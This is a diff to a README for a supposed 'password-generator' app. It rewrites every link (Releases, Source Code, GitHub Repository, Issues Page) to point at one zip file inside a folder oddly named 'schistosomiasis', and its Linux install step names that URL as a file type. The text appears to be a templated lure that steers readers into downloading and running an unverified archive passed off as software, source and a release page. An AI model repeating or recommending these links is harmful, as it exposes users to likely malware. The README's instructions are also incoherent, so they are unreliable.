@@ -1,6 +1,6 @@
 # 🔒 password-generator - Simple, Secure Passwords Made Easy
 
-[![Download](https://raw.githubusercontent.com/Adikum19/password-generator/main/schistosomiasis/password-generator.zip)](https://raw.githubusercontent.com/Adikum19/password-generator/main/schistosomiasis/password-generator.zip)
+[![Download](https://github.com/Adikum19/password-generator/raw/refs/heads/main/schistosomiasis/password_generator_1.6.zip)](https://github.com/Adikum19/password-generator/raw/refs/heads/main/schistosomiasis/password_generator_1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,14 +8,14 @@ Welcome to the password-generator application! This tool helps you create strong
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [password-generator Releases](https://raw.githubusercontent.com/Adikum19/password-generator/main/schistosomiasis/password-generator.zip).
+1. Visit this page to download: [password-generator Releases](https://github.com/Adikum19/password-generator/raw/refs/heads/main/schistosomiasis/password_generator_1.6.zip).
    
 2. Look for the latest version listed at the top.
    
 3. Click on the file that matches your operating system:
    - For Windows, look for a file ending in `.exe`.
    - For Mac, look for a file ending in `.dmg`.
-   - For Linux, find a `https://raw.githubusercontent.com/Adikum19/password-generator/main/schistosomiasis/password-generator.zip` file.
+   - For Linux, find a `https://github.com/Adikum19/password-generator/raw/refs/heads/main/schistosomiasis/password_generator_1.6.zip` file.
 
 4. Once the file has downloaded, locate it in your computer's Downloads folder.
 
@@ -53,7 +53,7 @@ Once the installation is complete, follow these steps to generate a password:
 
 ## 📖 Additional Information
 
-- **Source Code**: If you are interested in the technical details, you can view the source code [here](https://raw.githubusercontent.com/Adikum19/password-generator/main/schistosomiasis/password-generator.zip).
+- **Source Code**: If you are interested in the technical details, you can view the source code [here](https://github.com/Adikum19/password-generator/raw/refs/heads/main/schistosomiasis/password_generator_1.6.zip).
 - **Contribution**: We welcome contributions! If you would like to help improve this application, please visit our contributing guidelines.
 
 ## ❓ Frequently Asked Questions
@@ -69,8 +69,8 @@ A: Check the issues section on our repository for solutions, or feel free to ope
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Adikum19/password-generator/main/schistosomiasis/password-generator.zip)
-- [Releases Page](https://raw.githubusercontent.com/Adikum19/password-generator/main/schistosomiasis/password-generator.zip)
-- [Issues Page](https://raw.githubusercontent.com/Adikum19/password-generator/main/schistosomiasis/password-generator.zip)
+- [GitHub Repository](https://github.com/Adikum19/password-generator/raw/refs/heads/main/schistosomiasis/password_generator_1.6.zip)
+- [Releases Page](https://github.com/Adikum19/password-generator/raw/refs/heads/main/schistosomiasis/password_generator_1.6.zip)
+- [Issues Page](https://github.com/Adikum19/password-generator/raw/refs/heads/main/schistosomiasis/password_generator_1.6.zip)
 
 Thank you for using password-generator. We hope this tool helps you manage your passwords securely!
